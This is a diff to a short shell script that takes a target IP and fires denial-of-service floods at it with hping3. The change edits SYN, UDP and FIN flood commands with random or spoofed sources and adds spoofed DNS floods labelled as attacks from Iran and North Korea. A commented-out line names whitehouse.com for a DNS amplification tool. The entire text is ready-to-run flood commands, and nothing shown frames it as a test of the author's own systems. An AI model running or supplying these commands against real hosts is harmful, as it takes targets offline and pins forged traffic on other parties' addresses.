@@ -1,6 +1,6 @@
 #!/bin/sh
 # Christopher Gray
-# Version 0.2.18
+# Version 0.2.19
 #  2/26/2020
 
 if [ -z "$1" ]; then
@@ -29,10 +29,10 @@ echo "SYN Flood \r\n "
 sudo hping3 -S --flood -V -p 0 $server_ip
 
 echo "SYN Flood (Advanced) \r\n "
-sudo hping3 -c 20000 -d 120 -S -w 64 -p 22 --flood --rand-source $server_ip 2> /dev/null &
+sudo hping3 -c 20000 -d 120 -S -w 64 -p 0 --flood --rand-source $server_ip 2> /dev/null &
 
 echo "UDP FLood \r\n"
-sudo hping3 --flood --rand-source --udp -p 22 $server_ip 2> /dev/null &
+sudo hping3 --flood --rand-source --udp -p 0 $server_ip 2> /dev/null &
 
 echo "TCP FIN flood \r\n"
 sudo hping3 --flood --rand-source -F -p 0 $server_ip 2> /dev/null &
@@ -53,10 +53,17 @@ sudo hping3 --syn --flood --rand-source --win 65535 --ttl 64 --data 16000 --more
 
 #--- Attacks by Country -----
 echo "Attack from China (1.92.0.10), on DNS.. \r\n"
-hping3 --flood --udp -p 53 --spoof 1.92.0.10 $server_ip 2> /dev/null &
+sudo hping3 --flood --udp -p 53 --spoof 1.92.0.10 $server_ip 2> /dev/null &
 
 echo "Attack from Russia (2.72.0.10), on DNS.. \r\n"
-hping3 --flood --udp -p 53 --spoof 2.72.0.10 $server_ip 2> /dev/null &
+sudo hping3 --flood --udp -p 53 --spoof 2.72.0.10 $server_ip 2> /dev/null &
 
-echo "Attack from Nigeria (77.70.128.10), on DNS.. \r\n"
-hping3 --flood --udp -p 53 --spoof 77.70.128.10 $server_ip 2> /dev/null &
+echo "Attack from IRAN (Islamic Republic of) (5.57.32.10), on DNS.. \r\n"
+sudo hping3 --flood --udp -p 53 --spoof 5.57.32.10 $server_ip 2> /dev/null &
+
+echo "Attack from North Korea (175.45.176.10), on DNS.. \r\n"
+sudo hping3 --flood --udp -p 53 --spoof 175.45.176.10 $server_ip 2> /dev/null &
+
+#----
+#echo "Starting Tsunami... "
+#sudo ./tsunami -s $server_ip -n whitehouse.com -p 3 -f recursive_dns.txt
